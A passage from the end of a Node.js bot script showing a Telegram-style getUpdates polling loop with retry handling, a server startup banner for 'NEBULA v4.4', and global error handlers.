}

let offset = 0, errors = 0;
async function poll() {
  try {
    const r = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
    const d = await r.json();
    if (!d.ok) { errors++; if (errors > 10) process.exit(1); return setTimeout(poll, 5000); }
    errors = 0;
    if (d.result) for (const u of d.result) { offset = u.update_id + 1; await handleUpdate(u); }
  } catch (e) { errors++; if (errors > 10) process.exit(1); }
  poll();
}

app.listen(PORT, async () => { console.log(`\n⬡ NEBULA v4.4 :${PORT} @A2MBD3\n`); await validate(); poll(); });
process.on('uncaughtException', (e) => log('CRASH', e.message, 'error'));
process.on('unhandledRejection', (e) => log('REJECT', e?.message, 'error'));
